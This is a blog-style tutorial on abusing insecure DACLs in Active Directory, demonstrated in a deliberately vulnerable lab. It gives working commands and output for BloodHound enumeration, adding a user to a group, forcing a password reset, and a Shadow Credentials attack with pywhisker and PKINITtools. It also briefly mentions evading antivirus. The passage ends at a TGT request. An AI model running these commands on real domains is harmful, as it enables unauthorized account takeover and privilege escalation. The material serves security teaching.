
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AD - DACL Abuse</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link href="/css/articles.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">
    <link href="/css/monokai.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-logo">
                    <img src="/img/new-logo.png" alt="Logo">
                    <h3>elswix</h3>
                </div>
                <nav>
                    <ul class="nav flex-column">
                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
                    </ul>
                </nav>
            </aside>
            <!-- Main Content -->
            <main>
                <!-- Hero Section -->
                <section class="hero mb-5">
                    <img src="/img/articles/logo16.png" alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%">
                    <br/><h2>DACL Abuse</h2><br/>
                    <p>an introduction to DACL exploitation</p>
                </section>
                <section class="article-content">
                    <div class="article-container">
                        <div class="article-content-main">
                            <br/><h2>Introduction</h2><br/>
                           <p>In the previous article, we discussed Windows Access Control Lists (ACLs) and how they, in conjunction with Access Control Entries (ACEs), work to define privileges. Today, we'll explore the exploitation of insecure ACEs within the DACL of users and groups in an Active Directory environment.</p><br/>
<h3>Note</h3><br/>
<p>Before reading this article, I highly recommend going through my previous ones, where I introduce Kerberos and ACLs. These articles cover essential concepts that will help you fully understand the content of this article.</p><br/>
<h3>ACLs, DACL and ACEs</h3><br/>
<p>Before diving into ACL exploitation, let’s quickly recap the core concepts from the previous article.</p><br/>
<p>Access Control Lists (ACLs) are a fundamental security mechanism in Windows that define who can access specific resources and what actions they are allowed or denied to perform. An ACL is essentially a list of rules attached to an object (such as files, registry keys, or Active Directory objects) that controls access based on user identities or groups.</p><br/>
<p>A <strong>Discretionary Access Control List (DACL)</strong> is the most relevant type of ACL for our discussion. It specifies which users or groups have access to an object and what actions they can perform. Each rule within a DACL is called an <strong>Access Control Entry (ACE)</strong>, which either grants or denies permissions to a principal (user, group, or process).</p><br/>
<p>By understanding how ACLs, DACLs, and ACEs work together, we can now explore how misconfigurations can be exploited to escalate privileges or gain unauthorized access within an Active Directory environment.</p><br/>
<h3>Generic ACEs vs. Object-Specific ACEs</h3><br/>
<p>Access Control Entries (ACEs) are the rules within an Access Control List (ACL) that determine who can or cannot interact with a resource. Each ACE identifies a user or group, specifies the permissions granted or denied, and defines how these rules are inherited by sub-items.</p><br/>
<ul>
<li><strong>Generic ACEs</strong> apply standard permissions such as <strong>Read, Write, Execute,</strong> or <strong>Full Control</strong> across different types of objects. These ACEs simplify access management by assigning broad permissions without focusing on specific object attributes.</li>
<li><strong>Object-Specific ACEs</strong> provide finer control, allowing permissions to be set on particular parts of an object. For example, in Active Directory, a user might be allowed to update only their phone number while being restricted from modifying other account attributes.</li>
</ul>
<h3>Understanding Generic ACEs and How They Work</h3><br/>
<p>Generic ACEs simplify permission management by grouping common access rights into broad categories. Instead of defining detailed access rules for every object type, Generic ACEs provide a standardized way to control access using predefined permission sets. These permissions are commonly used in file systems, registry keys, and Active Directory objects.</p><br/>
<h3>How Generic ACEs Work</h3><br/>
<p>Each Generic ACE defines a set of common operations that can be applied to different object types. These permissions correspond to specific bits within the <strong>AccessMask</strong> field of an ACE, allowing or denying specific actions for a user or group.</p><br/>
<p>The main types of <strong>Generic ACEs</strong> are:</p><br/>
<ul>
<li><strong>GENERIC_READ</strong> – Grants read access to the object, allowing users to view its contents but not modify it.</li>
<li><strong>GENERIC_WRITE</strong> – Grants write access, allowing modifications to the object, such as changing a file’s content or updating an attribute in Active Directory.</li>
<li><strong>GENERIC_EXECUTE</strong> – Allows execution of the object, commonly used for running applications or scripts.</li>
<li><strong>GENERIC_ALL</strong> – Grants full control over the object, including reading, writing, executing, and modifying permissions.</li>
</ul>
<h4>How They Translate to Specific Permissions</h4>
<p>When a Generic ACE is applied, Windows translates it into a set of more detailed <strong>Standard and Specific Rights</strong> depending on the type of object. For example:</p><br/>
<ul>
<li>In a file system, <strong>GENERIC_READ</strong> maps to permissions like "Read Data" and "List Directory."</li>
<li>In Active Directory, <strong>GENERIC_WRITE</strong> might allow modifying certain attributes of an object but not changing its owner.</li>
</ul>
<h3>Understanding Object-Specific ACEs and Their Functionality</h3><br/>
<p>While <strong>Generic ACEs</strong> provide broad permissions, <strong>Object-Specific ACEs</strong> allow for fine-grained control over specific parts or attributes of an object. These ACEs are particularly useful in complex environments like <strong>Active Directory, registry keys, and certain file systems</strong>, where different users may need different levels of access to specific properties rather than the entire object.</p><br/>
<h3>How Object-Specific ACEs Work</h3><br/>
<p>Object-Specific ACEs include additional metadata that allows administrators to define permissions for <strong>specific attributes or components</strong> of an object. Unlike Generic ACEs, which apply the same broad permissions to all objects, Object-Specific ACEs can target:</p><br/>
<ul>
<li><strong>Individual properties or attributes</strong> (e.g., a user can update their phone number but not their department in Active Directory).</li>
<li><strong>Subcomponents of an object</strong> (e.g., a user has access to edit a registry key’s value but cannot modify its security settings).</li>
<li><strong>Inherited rules</strong> that define how permissions apply to child objects within a hierarchy.</li>
</ul>
<p>Examples of Object-Specific ACEs in Action:</p><br/>
<ul>
<li>A user may be allowed to <strong>edit their own phone number</strong> but not change their group memberships.</li>
<li>An administrator might grant help desk staff the ability to <strong>reset user passwords</strong> but not modify account ownership.</li>
</ul>
<p>By leveraging <strong>Object-Specific ACEs</strong>, administrators can <strong>tailor permissions</strong> to meet security and operational needs while minimizing risk, ensuring that users and processes only have the access they truly require.</p><br/>
<h3>Exploitation - Theory</h3><br/>
<p>However, as always, improperly assigned privileges can introduce security risks if not handled carefully. Let's imagine some scenarios:</p><br/>
<p><strong>1. GenericWrite on a User</strong></p><br/>
<p>Suppose you obtain credentials for a user called <code>bob</code>. <code>bob</code> has <strong>GenericWrite</strong> permissions on <code>karl</code>, meaning <code>bob</code> can modify any attribute of <code>karl</code> that is not explicitly protected. An attacker could exploit this by modifying <code>karl</code>’s <code>scriptPath</code> attribute to execute a malicious script the next time <code>karl</code> logs in, leading to privilege escalation.</p><br/>
<p><strong>2. ForceChangePassword on a User</strong></p><br/>
<p>Now suppose <code>bob</code> has <strong>ForceChangePassword</strong> over <code>karl</code>, this means he can reset <code>karl</code>'s password without knowing the old one. If <code>karl</code> is a privileged user, this effectively gives <code>bob</code> control over <code>karl</code>’s account.</p><br/>
<p><strong>3. GenericAll on a Group</strong></p><br/>
<p>If <code>bob</code> has <strong>GenericAll</strong> permissions over the "IT Admins" group, he essentially has <strong>full control</strong> over it. This allows him to <strong>add himself</strong> to the group, granting him all privileges associated with it—including administrative rights in some cases.</p><br/>
<p><strong>3. WriteDACL on a Computer Object</strong></p><br/>
<p>If <code>bob</code> has the <strong>WriteDACL</strong> permission on a user object in Active Directory, he gains the ability to modify the Discretionary Access Control List (DACL) associated with that object. This allows him to grant himself additional privileges, such as <code>GenericAll</code>, which provides full control over the user account. By exploiting this, <code>bob</code> could potentially alter the account's properties, reset passwords, or take complete control of the user's permissions, ultimately compromising the security of the account and potentially escalating his privileges within the domain.</p><br/>
<h3>Exploitation - Practice</h3><br/>
<p>Today, I have set up a deliberately vulnerable lab where we will exploit a chain of insecure DACLs to escalate privileges and gain access to the Administrator account in an Active Directory environment.</p><br/>
<p>Initially, let's imagine an scenario where we obtain credentials for the <code>joel</code> user. With valid credentials, we can start the enumeration process to identify dangerous privileges.</p><br/>
<p>There are several tools available for enumerating potentially exploitable ACLs. In this case, we’ll use <code>BloodHound</code>.</p><br/>
<h3>BloodHound</h3><br/>
<p><code>BloodHound</code> is a powerful tool used for Active Directory enumeration, allowing attackers and defenders to visualize relationships and privilege misconfigurations that could lead to privilege escalation. It maps out trust relationships, user permissions, and ACL misconfigurations, making it easier to identify exploitable attack paths.</p><br/>
<p>To collect data for <code>BloodHound</code>, we use <code>SharpHound</code>, a C#-based data collector that gathers information about users, groups, ACLs, sessions, and other AD components.</p><br/>
<p>Once the data is ingested into <code>BloodHound</code>, we can search for relationships where a low-privileged user has <strong>WriteDACL</strong>, <strong>GenericWrite</strong>, or <strong>GenericAll</strong> over a privileged account or group. If such a path exists, an attacker could escalate privileges by modifying ACLs to gain control over a high-value target, such as a Domain Admin account.</p><br/>
<p>There are two ways to run <strong>SharpHound</strong>: locally and remotely. The local method requires direct access to a machine, such as a reverse shell or any means that allows program execution on the target system. The remote method involves using <code>bloodhound-python</code>, a Python-based alternative to <strong>SharpHound</strong>, which can gather information without being executed on a domain-joined machine.</p><br/>
<p>When deciding between <strong>SharpHound</strong> and <strong>bloodhound-python</strong>, your access level to the target environment plays a crucial role.</p><br/>
<ul>
<li>
<p><strong>Local Execution (SharpHound):</strong> If you have an interactive session on a domain-joined machine—whether through a reverse shell, RDP access, or any other method that allows execution—you can run <code>SharpHound.exe</code> directly to gather ACL-related data. This method provides the most comprehensive results, as it collects information from Active Directory via LDAP queries and local enumeration.</p><br/>
</li>
<li>
<p><strong>Remote Execution (bloodhound-python):</strong> If you lack direct execution capabilities on a domain-joined machine, you can use <code>bloodhound-python</code>, a Python-based alternative that performs LDAP queries remotely. While it doesn't provide session data (like which users are logged into which machines), it is still effective for enumerating groups, users, and ACL misconfigurations from an external system. However, this method requires valid credentials within the domain in order to authenticate to the LDAP server.</p><br/>
</li>
</ul>
<p>The <code>SharpHound.exe</code> method has some drawbacks. For instance, if uploaded directly to the victim machine, it could be detected by antivirus software. While executing it from memory can help evade AV detection, other security measures might still be in place, so caution is advised when running it.</p><br/>
<p>In our case, we will opt for the python alternative since, in our scenario, we lack direct access to a domain-joined machine. </p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="nb">all</span> <span class="o">-</span><span class="n">u</span> <span class="n">joel</span> <span class="o">-</span><span class="n">p</span> <span class="n">P4ssw0rd2</span><span class="n">!</span> <span class="o">-</span><span class="n">ns</span> <span class="mf">192.168.100.3</span> <span class="o">--</span><span class="nb">zip</span> <span class="o">-</span><span class="n">d</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">BloodHound</span><span class="o">.</span><span class="n">py</span> <span class="n">for</span> <span class="n">BloodHound</span> <span class="n">LEGACY</span> <span class="p">(</span><span class="n">BloodHound</span> <span class="mf">4.2</span> <span class="n">and</span> <span class="mf">4.3</span><span class="p">)</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="n">AD</span> <span class="n">domain</span><span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="n">for</span> <span class="n">user</span>
<span class="n">WARNING</span><span class="p">:</span> <span class="n">Failed</span> <span class="n">to</span> <span class="n">get</span> <span class="n">Kerberos</span> <span class="n">TGT</span><span class="o">.</span> <span class="n">Falling</span> <span class="n">back</span> <span class="n">to</span> <span class="n">NTLM</span> <span class="n">authentication</span><span class="o">.</span> <span class="n">Error</span><span class="p">:</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KRB_AP_ERR_SKEW</span><span class="p">(</span><span class="n">Clock</span> <span class="n">skew</span> <span class="n">too</span> <span class="n">great</span><span class="p">)</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">forest</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">3</span> <span class="n">computers</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">13</span> <span class="n">users</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">53</span> <span class="n">groups</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">gpos</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">ous</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">19</span> <span class="n">containers</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">0</span> <span class="n">trusts</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Starting</span> <span class="n">computer</span> <span class="n">enumeration</span> <span class="n">with</span> <span class="mi">10</span> <span class="n">workers</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">Workstation02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">Workstation01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Done</span> <span class="ow">in</span> <span class="mi">00</span><span class="n">M</span> <span class="mi">01</span><span class="n">S</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">output</span> <span class="n">into</span> <span class="mi">20250219191816</span><span class="n">_bloodhound</span><span class="o">.</span><span class="n">zip</span>
</pre></div>
<p>Once the scan is complete, the results are saved in a ZIP file—in this case, <code>20250219191816_bloodhound.zip</code>.</p><br/>
<p>Now, let's open this file in BloodHound (if you're unsure how to do it, you can refer to this <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux">article</a>)</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/16/img/1.png"/></p><br/>
<p>As observed, the recollected data was successfully parsed, and now, we can start with the results analysis.</p><br/>
<p>There are many queries we can execute to identify potential privilege escalation paths. Initially, I'll look for the user we already have access which is <code>joel</code>.</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/16/img/2.png"/></p><br/>
<p>When inspecting the groups this user belongs to, we notice there is nothing interesting:</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/16/img/3.png"/></p><br/>
<p>Upon clicking on <strong>Reachable High Value Targets</strong>, a very large attack path is revelated:</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/16/img/4.png"/></p><br/>
<p>Of course, this is a deliberately, ctf like, vulnerable lab. While you won’t encounter such a scenario in real life, it provides a solid environment for practicing DACL abuse.</p><br/>
<p>Understanding the discovered attack path:</p><br/>
<ul>
<li><strong>Joel</strong> has <code>GenericAll</code> over the <strong>IT Managers</strong> group.</li>
<li>Members of <strong>IT Managers</strong> have <code>ForceChangePassword</code> over <strong>arthur</strong>.</li>
<li><strong>arthur</strong> has <code>GenericWrite</code> over <strong>john</strong>.</li>
<li><strong>john</strong> has <code>WriteSPN</code> over <strong>ellie</strong>.</li>
<li><strong>ellie</strong> has <code>WriteOwner</code> over <strong>elswix</strong>.</li>
<li>Finally, <strong>elswix</strong> has <code>AllExtendedRights</code> over the domain.</li>
</ul>
<br/><h2>Exploitation</h2><br/>
<p>In this article, I'll demonstrate how to exploit misconfigurations in ACLs remotely. While these attacks can also be reproduced locally through a reverse shell, I’ve chosen to focus on the remote approach for this example. In upcoming articles, we'll cover the local exploitation of similar scenarios.</p><br/>
<h3>GenericAll on IT Managers</h3><br/>
<p>Initially, we'll exploit the <code>GenericAll</code> privilege over the <strong>IT Managers</strong> group. The easiest way to abuse this is by adding our user to the <strong>IT Managers</strong> group. This allows us to inherit the group's privileges and subsequently use them to change <code>arthur</code>'s password.</p><br/>
<p>There are many tools that allow you to add a user to a specific group. I'll show you two methods.</p><br/>
<p>Using <code>net rpc</code>:</p><br/>
<p>First, we'll retrieve the current members of <strong>IT Managers</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">net</span> <span class="n">rpc</span> <span class="n">group</span> <span class="n">members</span> <span class="s2">"IT Managers"</span> <span class="o">-</span><span class="n">U</span> <span class="s1">'ELSWIXCORP/joel%P4ssw0rd2!'</span> <span class="o">-</span><span class="n">S</span> <span class="mf">192.168.100.3</span>
<span class="n">ELSWIXCORP</span>\<span class="n">claire</span>
<span class="n">ELSWIXCORP</span>\<span class="n">chris</span>
</pre></div>
<p>Now, let's attempt to add <code>joel</code> to <strong>IT Managers</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">net</span> <span class="n">rpc</span> <span class="n">group</span> <span class="n">addmem</span> <span class="s2">"IT Managers"</span> <span class="s2">"joel"</span> <span class="o">-</span><span class="n">U</span> <span class="s1">'ELSWIXCORP/joel%P4ssw0rd2!'</span> <span class="o">-</span><span class="n">S</span> <span class="mf">192.168.100.3</span>
</pre></div>
<p>If everything worked as expected, listing the members of <strong>IT Managers</strong> should now show that <code>joel</code> is a member:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">net</span> <span class="n">rpc</span> <span class="n">group</span> <span class="n">members</span> <span class="s2">"IT Managers"</span> <span class="o">-</span><span class="n">U</span> <span class="s1">'ELSWIXCORP/joel%P4ssw0rd2!'</span> <span class="o">-</span><span class="n">S</span> <span class="mf">192.168.100.3</span>
<span class="n">ELSWIXCORP</span>\<span class="n">claire</span>
<span class="n">ELSWIXCORP</span>\<span class="n">joel</span>
<span class="n">ELSWIXCORP</span>\<span class="n">chris</span>
</pre></div>
<p>Great! It worked. Now <code>joel</code> will inherit all the outbound privileges that <strong>IT Managers</strong> has.</p><br/>
<p>Using <code>bloodyAD</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">--</span><span class="n">host</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">u</span> <span class="n">joel</span> <span class="o">-</span><span class="n">p</span> <span class="n">P4ssw0rd2</span><span class="n">!</span> <span class="n">add</span> <span class="n">groupMember</span> <span class="s2">"IT Managers"</span> <span class="n">joel</span>
<span class="p" style="color: #2d9e34">[+]</span> <span class="n">joel</span> <span class="n">added</span> <span class="n">to</span> <span class="n">IT</span> <span class="n">Managers</span>
</pre></div>
<h3>ForceChangePassword on arthur</h3><br/>
<p>Now, as joel, we inherit the privileges of the IT Managers group. This means <strong>joel</strong> has <code>ForceChangePassword</code> over <strong>arthur</strong>. Essentially, we can modify <strong>arthur</strong>'s password. Although this could be invasive in a Real-world environment, we're in a lab so we don't have to worry about that.</p><br/>
<p>Againly, there are several tools that allow you to abuse this privilege and modify users' passwords. I'll show you how this can be achieved using <code>net rpc</code> and <code>bloodyAD</code>. </p><br/>
<p>Using <code>net rpc</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">net</span> <span class="n">rpc</span> <span class="n">password</span> <span class="n">arthur</span> <span class="s1">'P4ssword123!'</span> <span class="o">-</span><span class="n">U</span> <span class="s1">'ELSWIXCORP.LOCAL/joel%P4ssw0rd2!'</span> <span class="o">-</span><span class="n">S</span> <span class="mf">192.168.100.3</span>
</pre></div>
<p>This sets <code>P4ssword123!</code> as the new password for <code>arthur</code>. </p><br/>
<p>Using <code>bloodyAD</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">--</span><span class="n">host</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">u</span> <span class="n">joel</span> <span class="o">-</span><span class="n">p</span> <span class="n">P4ssw0rd2</span><span class="n">!</span> <span class="nb">set</span> <span class="n">password</span> <span class="n">arthur</span> <span class="s1">'P4ssword123!'</span>
<span class="p" style="color: #2d9e34">[+]</span> <span class="n">Password</span> <span class="n">changed</span> <span class="n">successfully</span><span class="n">!</span>
</pre></div>
<p>You can verify whether the password was modified using <code>netexec</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">u</span> <span class="n">arthur</span> <span class="o">-</span><span class="n">p</span> <span class="n">P4ssword123</span><span class="n">!</span>
<span class="p">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2489a5">[*]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="p">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2d9e34">[+]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">arthur</span><span class="p">:</span><span class="n">P4ssword123</span><span class="n">!</span>
</pre></div>
<p>Great! The password has been changed successfully.</p><br/>
<h3>GenericWrite over John</h3><br/>
<p>As shown in BloodHound, <strong>Arthur</strong> has the <strong>GenericWrite</strong> permission over <strong>John</strong>. This means <strong>Arthur</strong> can modify <strong>John</strong>'s non-protected attributes, among others. While <strong>GenericWrite</strong> does not allow modifying a user's password directly, it is possible to leverage other attributes to gain access to <strong>John</strong>'s account.</p><br/>
<p>There are multiple ways to abuse <strong>GenericWrite</strong>. One example is modifying the <code>scriptLogon</code> attribute, which specifies the path to a logon script. When the user logs into the computer, the script is executed, potentially allowing you to gain access to the system as that user.</p><br/>
<p>However, this approach requires user interaction, as the user must log into the computer for the script to execute. You could create a scheduled task to automate the authentication process, but there's also another way to exploit this.</p><br/>
<h3>Shadow Credentials</h3>
<p>Shadow Credentials is a technique that allows an attacker to set an alternative key for authenticating as another user in Active Directory. This is achieved by abusing the <strong>msDS-KeyCredentialLink</strong> attribute, which stores public keys used for modern authentication methods. If an attacker has <strong>GenericWrite</strong> over a user, they can modify this attribute to associate their own key, enabling authentication without changing the target user's password.</p><br/>
<p>This method is stealthy, as it does not trigger password change events and can evade many traditional monitoring solutions.</p><br/>
<p>As always, there are couple of tools to carry out the same attack. In this case, I'll use <a href="https://github.com/ShutdownRepo/pywhisker">pywhisker</a>, which is the python alternative to the original <a href="https://github.com/eladshamir/Whisker">Whisker</a>, which is a tool designed to exploit <strong>Shadow Credentials</strong> by generating and injecting key-based authentication material into the <strong>msDS-KeyCredentialLink</strong> attribute of a target user. <code>Whisker</code> automates the process of generating a certificate, adding the corresponding public key to the target account, and allowing the attacker to authenticate as that user without knowing their password.</p><br/>
<p><code>pywhisker</code> replicates this functionality in Python, making it more flexible for various environments and reducing the need for direct execution on a Windows machine.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">pywhisker</span> <span class="o">--</span><span class="n">action</span> <span class="n">add</span> <span class="o">-</span><span class="n">d</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">u</span> <span class="n">arthur</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'P4ssword123!'</span> <span class="o">--</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">t</span> <span class="n">john</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Searching</span> <span class="n">for</span> <span class="n">the</span> <span class="n">target</span> <span class="n">account</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Target</span> <span class="n">user</span> <span class="n">found</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">John</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Generating</span> <span class="n">certificate</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Certificate</span> <span class="n">generated</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Generating</span> <span class="n">KeyCredential</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">KeyCredential</span> <span class="n">generated</span> <span class="n">with</span> <span class="n">DeviceID</span><span class="p">:</span> <span class="n">a34e80cc</span><span class="o">-</span><span class="mi">6</span><span class="n">fb7</span><span class="o">-</span><span class="mi">1</span><span class="n">c5a</span><span class="o">-</span><span class="n">f023</span><span class="o">-</span><span class="n">e4535c0dbbae</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Updating</span> <span class="n">the</span> <span class="n">msDS</span><span class="o">-</span><span class="n">KeyCredentialLink</span> <span class="n">attribute</span> <span class="n">of</span> <span class="n">john</span>
<span class="p" style="color: #2d9e34">[+]</span> <span class="n">Updated</span> <span class="n">the</span> <span class="n">msDS</span><span class="o">-</span><span class="n">KeyCredentialLink</span> <span class="n">attribute</span> <span class="n">of</span> <span class="n">the</span> <span class="n">target</span> <span class="nb">object</span>
<span class="p" style="color: #2d9e34">[+]</span> <span class="n">Saved</span> <span class="n">PFX</span> <span class="p">(</span><span class="n">#PKCS12<span class="p">)</span> certificate &amp; key at path: jPkjXpLo.pfx</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Must</span> <span class="n">be</span> <span class="n">used</span> <span class="n">with</span> <span class="n">password</span><span class="p">:</span> <span class="n">sUPJIoebvkwrDSvQE0fr</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">A</span> <span class="n">TGT</span> <span class="n">can</span> <span class="n">now</span> <span class="n">be</span> <span class="n">obtained</span> <span class="n">with</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dirkjanm</span><span class="o">/</span><span class="n">PKINITtools</span>
</pre></div>
<p>Great, it worked perfectly! As seen in the output, <code>pywhisker</code> successfully saved a PFX certificate named <code>jPkjXpLo.pfx</code>, with the password <code>sUPJIoebvkwrDSvQE0fr</code>. Additionally, it suggests using <code>PKINITtools</code> to leverage the <code>PFX</code> certificate to obtain a <strong>TGT</strong> for <strong>john</strong>.</p><br/>
<p>I'll start by cloning the repository and running the <code>gettgtpkinit.py</code> script. This script uses a <code>PFX</code> certificate as an authentication method, allowing us to authenticate to the <strong>Domain Controller (DC)</strong> and obtain a <strong>TGT</strong> for <strong>john</strong>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">PKINITtools</span><span class="o">/</span><span class="n">gettgtpkinit</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">pfx</span> <span class="n">jPkjXpLo</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">pfx</span><span class="o">-</span><span class="k">pass</span> <span class="n">sUPJIoebvkwrDSvQE0fr</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">john</span> <span class="n">john</span><span class="o">.</span><span class="n">ccache</span>
